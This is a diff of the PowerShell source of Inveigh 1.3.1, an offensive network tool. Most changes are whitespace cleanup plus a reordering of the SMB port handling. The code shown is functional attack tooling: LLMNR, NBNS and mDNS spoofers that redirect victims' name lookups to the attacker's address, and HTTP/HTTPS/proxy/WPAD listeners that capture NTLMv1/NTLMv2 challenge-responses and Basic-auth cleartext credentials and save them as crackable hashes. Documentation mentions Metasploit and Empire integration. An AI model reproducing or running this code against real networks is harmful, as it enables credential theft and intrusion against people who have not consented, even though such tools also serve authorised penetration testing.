@@ -26,7 +26,7 @@ Default = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If
 shell, test to ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.
 
 .PARAMETER ConsoleQueueLimit
-Default = Unlimited: Maximum number of queued up console log entries when not using the real time console. 
+Default = Unlimited: Maximum number of queued up console log entries when not using the real time console.
 
 .PARAMETER ConsoleStatus
 (Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for
@@ -62,7 +62,7 @@ Default = 80: TCP port for the HTTP listener.
 
 .PARAMETER HTTPAuth
 Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type. This setting does not
-apply to wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation. 
+apply to wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation.
 
 .PARAMETER HTTPBasicRealm
 Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.
@@ -79,7 +79,7 @@ Filename within the HTTPDir to serve as the default HTTP/HTTPS/Proxy response fi
 wpad.dat requests.
 
 .PARAMETER HTTPDefaultEXE
-EXE filename within the HTTPDir to serve as the default HTTP/HTTPS/Proxy response for EXE requests. 
+EXE filename within the HTTPDir to serve as the default HTTP/HTTPS/Proxy response for EXE requests.
 
 .PARAMETER HTTPResetDelay
 Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
@@ -156,7 +156,7 @@ Default = Disabled: (Integer) Number of seconds the NBNS brute force spoofer wil
 HTTP request is received.
 
 .PARAMETER NBNSBruteForceTarget
-IP address to target for NBNS brute force spoofing. 
+IP address to target for NBNS brute force spoofing.
 
 .PARAMETER NBNSTTL
 Default = 165 Seconds: NBNS TTL in seconds for the response packet.
@@ -196,7 +196,7 @@ Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 .PARAMETER SMB
 Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still
 direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to
-prevent login requests from being processed by the Inveigh host.  
+prevent login requests from being processed by the Inveigh host.
 
 .PARAMETER SpooferHostsIgnore
 Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR/mDNS/NBNS.
@@ -225,7 +225,7 @@ SpooferLearning.
 
 .PARAMETER SpooferLearningInterval
 Default = 30 Minutes: (Integer) Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a
-hostname that has already been checked if SpooferLearning is enabled.   
+hostname that has already been checked if SpooferLearning is enabled.
 
 .PARAMETER SpooferRepeat
 Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user
@@ -246,7 +246,7 @@ Default = Unlimited: (Integer) Number of NTLMv1/NTLMv2/cleartext captures to per
 .PARAMETER Tool
 Default = 0: (0/1/2) Enable/Disable features for better operation through external tools such as Meterpreter's
 PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
-0 = None, 1 = Metasploit/Meterpreter, 2 = Empire   
+0 = None, 1 = Metasploit/Meterpreter, 2 = Empire
 
 .PARAMETER WPADAuth
 Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type for wpad.dat requests.
@@ -256,7 +256,7 @@ during negotiation.
 .PARAMETER WPADAuthIgnore
 Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
 will be skipped for NTLM authentication. This can be used to filter out browsers like Firefox that display login
-popups for authenticated wpad.dat requests such as Firefox.   
+popups for authenticated wpad.dat requests such as Firefox.
 
 .PARAMETER WPADDirectFile
 Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests.
@@ -306,16 +306,16 @@ useful for sending traffic to a controlled Linux system on another subnet.
 
 .EXAMPLE
 Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
-Execute specifying an HTTP redirect response. 
+Execute specifying an HTTP redirect response.
 
 .LINK
 https://github.com/Kevin-Robertson/Inveigh
 #>
 
-# Parameter default values can be modified in this section: 
+# Parameter default values can be modified in this section:
 [CmdletBinding()]
 param
-( 
+(
     [parameter(Mandatory=$false)][Array]$HTTPResetDelay = "Firefox",
     [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
     [parameter(Mandatory=$false)][Array]$SpooferHostsReply = "",
@@ -399,13 +399,13 @@ if ($invalid_parameter)
 $inveigh_version = "1.3.1"
 
 if(!$IP)
-{ 
+{
     $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
 }
 
 if(!$SpooferIP)
 {
-    $SpooferIP = $IP  
+    $SpooferIP = $IP
 }
 
 if($HTTPDefaultFile -or $HTTPDefaultEXE)
@@ -443,7 +443,7 @@ if($NBNSBruteForce -eq 'Y' -and !$NBNSBruteForceTarget)
 }
 
 if(!$FileOutputdirectory)
-{ 
+{
     $output_directory = $PWD.Path
 }
 else
@@ -507,7 +507,7 @@ if($ElevatedPrivilege -eq 'Auto')
 }
 else
 {
- 
+
     if($ElevatedPrivilege -eq 'Y')
     {
         $elevated_privilege = $true
@@ -516,7 +516,7 @@ else
     {
         $elevated_privilege = $false
     }
-    
+
 }
 
 if($StartupChecks -eq 'Y')
@@ -763,7 +763,7 @@ if($NBNS -eq 'Y')
 {
     $NBNSTypes_output = $NBNSTypes -join ","
     $NBNS_response_message = "- response sent"
-    
+
     if($NBNSTypes.Count -eq 1)
     {
         $inveigh.status_queue.Add("NBNS Spoofer For Type $NBNSTypes_output = Enabled")  > $null
@@ -781,7 +781,7 @@ else
 }
 
 if($NBNSBruteForce -eq 'Y')
-{   
+{
     $inveigh.status_queue.Add("NBNS Brute Force Spoofer Target = $NBNSBruteForceTarget") > $null
     $inveigh.status_queue.Add("NBNS Brute Force Spoofer IP Address = $SpooferIP") > $null
     $inveigh.status_queue.Add("NBNS Brute Force Spoofer Hostname = $NBNSBruteForceHost") > $null
@@ -810,7 +810,7 @@ if($SpooferLearning -eq 'Y' -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
     {
         $inveigh.status_queue.Add("Spoofer Learning Delay = $SpooferLearningDelay Minutes")  > $null
     }
-    
+
     if($SpooferLearningInterval -eq 1)
     {
         $inveigh.status_queue.Add("Spoofer Learning Interval = $SpooferLearningInterval Minute")  > $null
@@ -908,7 +908,7 @@ if($HTTPS -eq 'Y')
     {
 
         try
-        { 
+        {
             $inveigh.certificate_issuer = $HTTPSCertIssuer
             $inveigh.certificate_CN = $HTTPSCertSubject
             $inveigh.status_queue.Add("HTTPS Certificate Issuer = " + $inveigh.certificate_issuer)  > $null
@@ -956,7 +956,7 @@ if($HTTPS -eq 'Y')
             }
             else
             {
-                
+
                 if($HTTPSForceCertDelete -eq 'Y')
                 {
                     $inveigh.HTTPS_force_certificate_delete = $true
@@ -965,16 +965,16 @@ if($HTTPS -eq 'Y')
                 $inveigh.HTTPS_existing_certificate = $true
                 $inveigh.status_queue.Add("HTTPS Capture = Using Existing Certificate")  > $null
             }
-            
+
             $inveigh.HTTPS = $true
 
             if($HTTPIP -ne '0.0.0.0')
-            { 
+            {
                 $inveigh.status_queue.Add("HTTPS IP = $HTTPIP") > $null
             }
 
             if($HTTPSPort -ne 443)
-            {   
+            {
                 $inveigh.status_queue.Add("HTTPS Port = $HTTPSPort") > $null
             }
 
@@ -1122,7 +1122,7 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
     {
         $inveigh.status_queue.Add("WPAD Response = Enabled")  > $null
         $inveigh.status_queue.Add("WPAD = $WPADIP`:$WPADPort")  > $null
-        
+
         if($WPADDirectHosts)
         {
             ForEach($WPAD_direct_host in $WPADDirectHosts)
@@ -1246,7 +1246,7 @@ elseif($RunTime -gt 1)
 if($ShowHelp -eq 'Y')
 {
     $inveigh.status_queue.Add("Run Stop-Inveigh to stop Inveigh")  > $null
-        
+
     if($inveigh.console_output)
     {
         $inveigh.status_queue.Add("Press any key to stop real time console output")  > $null
@@ -1513,8 +1513,8 @@ $SMB_NTLM_functions_scriptblock =
 }
 
 # HTTP Server ScriptBlock - HTTP/HTTPS/Proxy listener
-$HTTP_scriptblock = 
-{ 
+$HTTP_scriptblock =
+{
     param ($Challenge,$HTTPAuth,$HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDir,$HTTPResetDelay,$HTTPResetDelayTimeout,$HTTPResponse,
     $HTTPS_listener,$NBNSBruteForcePause,$Proxy,$ProxyIgnore,$proxy_listener,$WPADAuth,$WPADAuthIgnore,$WPADResponse)
 
@@ -1570,7 +1570,7 @@ $HTTP_scriptblock =
         $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
         $NTLM = "NTLM " + $NTLM_challenge_base64
         $NTLM_challenge = $HTTP_challenge
-        
+
         return $NTLM
     }
 
@@ -1606,7 +1606,7 @@ $HTTP_scriptblock =
         $HTTP_linger = New-Object System.Net.Sockets.LingerOption($true,0)
         $HTTP_listener.Server.LingerState = $HTTP_linger
     }
-    
+
     try
     {
         $HTTP_listener.Start()
@@ -1627,7 +1627,7 @@ $HTTP_scriptblock =
         }
 
     }
-    
+
     :HTTP_listener_loop while($inveigh.running -and $HTTP_running)
     {
         $TCP_request = ""
@@ -1653,15 +1653,15 @@ $HTTP_scriptblock =
             {
                 break HTTP_listener_loop
             }
-        
+
         }
 
         if($HTTPS_listener)
         {
-            
+
             if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.running)
             {
-                $HTTP_client = $HTTP_listener.AcceptTcpClient() 
+                $HTTP_client = $HTTP_listener.AcceptTcpClient()
 	            $HTTP_clear_stream = $HTTP_client.GetStream()
                 $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)
                 $SSL_cert = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $inveigh.certificate_CN})
@@ -1670,7 +1670,7 @@ $HTTP_scriptblock =
 
             [Byte[]]$SSL_request_bytes = $null
 
-            do 
+            do
             {
                 $HTTP_request_byte_count = $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
                 $SSL_request_bytes += $TCP_request_bytes[0..($HTTP_request_byte_count - 1)]
@@ -1683,7 +1683,7 @@ $HTTP_scriptblock =
 
             if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.running)
             {
-                $HTTP_client = $HTTP_listener.AcceptTcpClient() 
+                $HTTP_client = $HTTP_listener.AcceptTcpClient()
 	            $HTTP_stream = $HTTP_client.GetStream()
             }
 
@@ -1716,7 +1716,7 @@ $HTTP_scriptblock =
                 $inveigh.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                 $inveigh.hostname_spoof = $true
             }
-            
+
             if($TCP_request -like "*-48-6F-73-74-3A-20-*")
             {
                 $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf("-48-6F-73-74-3A-20-") + 19)
@@ -1778,7 +1778,7 @@ $HTTP_scriptblock =
                 }
 
             }
-            
+
             if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
             {
                 $HTTP_header_authorization_extract = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
@@ -1816,7 +1816,7 @@ $HTTP_scriptblock =
                     $HTTP_response_status_code = 0x34,0x30,0x31
                     $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                 }
-                
+
                 $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
                 $HTTP_client_close = $false
             }
@@ -1849,13 +1849,13 @@ $HTTP_scriptblock =
 
                 $HTTP_POST_request_old = $HTTP_POST_request
             }
-            
+
             if($HTTP_header_authorization.StartsWith('NTLM '))
             {
-                
+
                 $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''
                 [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)
-            
+
                 if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                 {
                     $NTLM = NTLMChallengeBase64 $Challenge $HTTPNTLMESS $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
@@ -1869,31 +1869,31 @@ $HTTP_scriptblock =
                     [String]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + '*'
                     $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                     $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(",")) + 1)
-                       
+
                     if($HTTP_NTLM_domain_length -eq 0)
                     {
                         $HTTP_NTLM_domain_string = ""
                     }
                     else
-                    {  
+                    {
                         $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes
-                    } 
-                    
+                    }
+
                     $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
                     $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
                     $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
                     $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
                     $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
                     $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes
-        
+
                     if($HTTP_NTLM_length -eq 24) # NTLMv1
                     {
                         $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                         $NTLM_response = $NTLM_response.Insert(48,':')
                         $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
-                    
+
                         if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
-                        {          
+                        {
                             $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash)
 
                             if($inveigh.file_output)
@@ -1905,7 +1905,7 @@ $HTTP_scriptblock =
                             {
                                 $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
                             }
-                        
+
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                             {
                                 $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash")
@@ -1930,7 +1930,7 @@ $HTTP_scriptblock =
 
                     }
                     else # NTLMv2
-                    {         
+                    {
                         $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                         $NTLM_response = $NTLM_response.Insert(32,':')
                         $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
@@ -1948,7 +1948,7 @@ $HTTP_scriptblock =
                             {
                                 $inveigh.log.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
                             }
-                        
+
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                             {
                                 $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash")
@@ -1968,7 +1968,7 @@ $HTTP_scriptblock =
                             {
                                 $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
                             }
-                        
+
                         }
 
                     }
@@ -1977,7 +1977,7 @@ $HTTP_scriptblock =
                     {
                         $inveigh.IP_capture_list.Add($HTTP_source_IP)
                     }
-                
+
                     $HTTP_response_status_code = 0x32,0x30,0x30
                     $HTTP_response_phrase = 0x4f,0x4b
                     $HTTP_client_close = $true
@@ -1985,7 +1985,7 @@ $HTTP_scriptblock =
 
                     if($proxy_listener)
                     {
-                        
+
                         if($HTTPResponse -or $HTTPDir)
                         {
                             $HTTP_header_cache_control = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
@@ -2025,7 +2025,7 @@ $HTTP_scriptblock =
                 {
                     $inveigh.log.Add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP")
                 }
-                 
+
             }
 
             if(($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (
@@ -2064,13 +2064,13 @@ $HTTP_scriptblock =
                         {
                             [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTPResponse)
                         }
-            
+
                     }
 
                 }
                 else
                 {
-                
+
                     if($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
                     {
                         $HTTP_message = $WPADResponse
@@ -2079,7 +2079,7 @@ $HTTP_scriptblock =
                     elseif($HTTPResponse)
                     {
                         $HTTP_message = $HTTPResponse
-                        
+
                         if($HTTPContentType)
                         {
                             $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes($HTTPContentType)
@@ -2175,7 +2175,7 @@ $HTTP_scriptblock =
             }
 
         }
-    
+
     }
 
     $HTTP_client.Close()
@@ -2188,14 +2188,14 @@ $HTTP_scriptblock =
 }
 
 # Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
-$sniffer_scriptblock = 
+$sniffer_scriptblock =
 {
     param ($IP,$LLMNR,$LLMNR_response_message,$LLMNRTTL,$mDNS,$mDNS_response_message,$mDNSTypes,$mDNSTTL,$NBNS,$NBNS_response_message,$NBNSTypes,$NBNSTTL,$SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,$SpooferIPsIgnore,$SpooferIPsReply,
             $SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval)
 
     $sniffer_running = $true
-    $byte_in = New-Object System.Byte[] 4	
-    $byte_out = New-Object System.Byte[] 4	
+    $byte_in = New-Object System.Byte[] 4
+    $byte_out = New-Object System.Byte[] 4
     $byte_data = New-Object System.Byte[] 4096
     $byte_in[0] = 1
     $byte_in[1-3] = 0
@@ -2238,7 +2238,7 @@ $sniffer_scriptblock =
     $NBNS_learning_log = New-Object System.Collections.Generic.List[string]
 
     if($SpooferLearningDelay)
-    {    
+    {
         $spoofer_learning_delay = New-TimeSpan -Minutes $SpooferLearningDelay
         $spoofer_learning_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     }
@@ -2259,11 +2259,11 @@ $sniffer_scriptblock =
         $destination_IP_bytes = $binary_reader.ReadBytes(4)
         $destination_IP = [System.Net.IPAddress]$destination_IP_bytes
         $header_length = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
-        
+
         switch($protocol_number)
         {
-            
-            6 
+
+            6
             {  # TCP
                 $source_port = DataToUInt16 $binary_reader.ReadBytes(2)
                 $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
@@ -2275,26 +2275,8 @@ $sniffer_scriptblock =
                 switch ($destination_port)
                 {
 
-                    139 
+                    139
                     {
-                        if($SMB -eq 'Y')
-                        {
-
-                            if($NTLM_challenge -and $client_IP -eq $source_IP -and $client_port -eq $source_port)
-                            {
-                                SMBNTLMResponse $payload_bytes
-                            }
-
-                            $client_IP = ""
-                            $client_port = ""
-                            $NTLM_challenge = ""
-                        
-                        }
-                    }
-
-                    445
-                    {
-                     
                         if($SMB -eq 'Y')
                         {
 
@@ -2308,7 +2290,25 @@ $sniffer_scriptblock =
                             $NTLM_challenge = ""
 
                         }
-                    
+                    }
+
+                    445
+                    {
+
+                        if($SMB -eq 'Y')
+                        {
+
+                            if($NTLM_challenge -and $client_IP -eq $source_IP -and $client_port -eq $source_port)
+                            {
+                                SMBNTLMResponse $payload_bytes
+                            }
+
+                            $client_IP = ""
+                            $client_port = ""
+                            $NTLM_challenge = ""
+
+                        }
+
                     }
 
                 }
@@ -2317,35 +2317,35 @@ $sniffer_scriptblock =
                 switch ($source_port)
                 {
 
-                    139 
+                    139
                     {
 
                         if($SMB -eq 'Y')
-                        {   
-                            $client_IP = $destination_IP 
+                        {
+                            $client_IP = $destination_IP
                             $client_port = $destination_port
                             $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                         }
-                    
+
                     }
 
-                    445 
+                    445
                     {
 
                         if($SMB -eq 'Y')
-                        {   
-                            $client_IP = $destination_IP 
+                        {
+                            $client_IP = $destination_IP
                             $client_port = $destination_port
                             $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                         }
-                    
+
                     }
-                
+
                 }
 
             }
-                
-            17 
+
+            17
             {  # UDP
                 $source_port = $binary_reader.ReadBytes(2)
                 $endpoint_source_port = DataToUInt16 ($source_port)
@@ -2355,22 +2355,22 @@ $sniffer_scriptblock =
                 $binary_reader.ReadBytes(2) > $null
                 $payload_bytes = $binary_reader.ReadBytes(($UDP_length_uint - 2) * 4)
 
-                # Incoming packets 
+                # Incoming packets
                 switch($destination_port)
                 {
 
                     137 # NBNS
                     {
-                     
+
                         if(([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($payload_bytes[10..11]) -ne '00-01')
                         {
                             $UDP_length[0] += 12
-                        
+
                             $NBNS_response_data = $payload_bytes[13..$payload_bytes.Length] +
                                                     $NBNS_TTL_bytes +
                                                     0x00,0x06,0x00,0x00 +
                                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
-                
+
                             $NBNS_response_packet = 0x00,0x89 +
                                                     $source_port[1,0] +
                                                     $UDP_length[1,0] +
@@ -2378,9 +2378,9 @@ $sniffer_scriptblock =
                                                     $payload_bytes[0,1] +
                                                     0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                     $NBNS_response_data
-                
+
                             $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
-                    
+
                             switch ($NBNS_query_type)
                             {
 
@@ -2429,7 +2429,7 @@ $sniffer_scriptblock =
                             $NBNS_query_string_subtracted = ""
                             $NBNS_query_string = ""
                             $n = 0
-                            
+
                             do
                             {
                                 $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
@@ -2437,9 +2437,9 @@ $sniffer_scriptblock =
                                 $n += 1
                             }
                             until($n -gt ($NBNS_query_string_encoded.Length - 1))
-                    
+
                             $n = 0
-                    
+
                             do
                             {
                                 $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
@@ -2454,7 +2454,7 @@ $sniffer_scriptblock =
 
                                 if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $NBNS_query_string -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -and $source_IP -ne $IP)
                                 {
-                                
+
                                     if(($NBNS_learning_log.Exists({param($s) $s -like "20* $NBNS_query_string"})))
                                     {
                                         $NBNS_learning_queue_time = [DateTime]$NBNS_learning_log.Find({param($s) $s -like "20* $NBNS_query_string"}).SubString(0,19)
@@ -2471,7 +2471,7 @@ $sniffer_scriptblock =
 
                                     }
                                     else
-                                    {           
+                                    {
                                         $NBNS_learning_send = $true
                                     }
 
@@ -2508,7 +2508,7 @@ $sniffer_scriptblock =
                                     }
 
                                 }
-                                 
+
                                 if(($inveigh.valid_host_list -notcontains $NBNS_query_string -or $SpooferHostsReply -contains $NBNS_query_string) -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
                                 !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (
                                 !$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($NBNS_query_string.Trim() -ne '*') -and (
@@ -2529,7 +2529,7 @@ $sniffer_scriptblock =
                                     {
                                         $NBNS_request_ignore = $true
                                     }
-                                    
+
                                 }
                                 else
                                 {
@@ -2632,8 +2632,8 @@ $sniffer_scriptblock =
                     }
 
                     5353 # mDNS
-                    {   
-                        
+                    {
+
                         if([System.BitConverter]::ToString($payload_bytes) -like '*-00-01-80-01')
                         {
                             $UDP_length[0] += 10
@@ -2646,7 +2646,7 @@ $sniffer_scriptblock =
                                                     $mDNS_TTL_bytes +
                                                     0x00,0x04 +
                                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
-                        
+
                             $mDNS_response_packet = 0x14,0xe9 +
                                                     $source_port[1,0] +
                                                     $UDP_length[1,0] +
@@ -2654,7 +2654,7 @@ $sniffer_scriptblock =
                                                     $payload_bytes[0,1] +
                                                     0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                     $mDNS_response_data
-                            
+
                             if($mDNS -eq 'Y')
                             {
 
@@ -2696,9 +2696,9 @@ $sniffer_scriptblock =
                                     {
                                         $mDNS_response_message = "- not spoofed due to previous capture"
                                     }
-                                
+
                                 }
-                            
+
                             }
 
                             $inveigh.console_queue.Add("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
@@ -2728,7 +2728,7 @@ $sniffer_scriptblock =
                                                     0x00,0x04 +
                                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
 
-                        
+
                             $mDNS_response_packet = 0x14,0xe9 +
                                                     $source_port[1,0] +
                                                     $UDP_length[1,0] +
@@ -2736,7 +2736,7 @@ $sniffer_scriptblock =
                                                     $payload_bytes[0,1] +
                                                     0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                     $mDNS_response_data
-                   
+
                             if($mDNS -eq 'Y')
                             {
 
@@ -2778,9 +2778,9 @@ $sniffer_scriptblock =
                                     {
                                         $mDNS_response_message = "- not spoofed due to previous capture"
                                     }
-                                
+
                                 }
-                            
+
                             }
 
                             $inveigh.console_queue.Add("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message")
@@ -2796,7 +2796,7 @@ $sniffer_scriptblock =
                             }
 
                         }
-                        
+
                     }
 
                     5355 # LLMNR
@@ -2811,7 +2811,7 @@ $sniffer_scriptblock =
                                                     $LLMNR_TTL_bytes +
                                                     0x00,0x04 +
                                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
-            
+
                             $LLMNR_response_packet = 0x14,0xeb +
                                                         $source_port[1,0] +
                                                         $UDP_length[1,0] +
@@ -2819,7 +2819,7 @@ $sniffer_scriptblock =
                                                         $payload_bytes[0,1] +
                                                         0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                         $LLMNR_response_data
-                
+
                             $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])
                             $LLMNR_query = $LLMNR_query -replace "-00",""
 
@@ -2835,7 +2835,7 @@ $sniffer_scriptblock =
                             }
 
                             $LLMNR_request_ignore = $false
-                
+
                             if($LLMNR -eq 'Y')
                             {
 
@@ -2858,7 +2858,7 @@ $sniffer_scriptblock =
 
                                     }
                                     else
-                                    {           
+                                    {
                                         $LLMNR_learning_send = $true
                                     }
 
@@ -2907,7 +2907,7 @@ $sniffer_scriptblock =
                                     {
                                         $LLMNR_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                         $LLMNR_send_socket.SendBufferSize = 1024
-                                        $LLMNR_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
+                                        $LLMNR_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port)
                                         $LLMNR_send_socket.SendTo($LLMNR_response_packet,$LLMNR_destination_point)
                                         $LLMNR_send_socket.Close()
                                         $LLMNR_response_message = "- response sent"
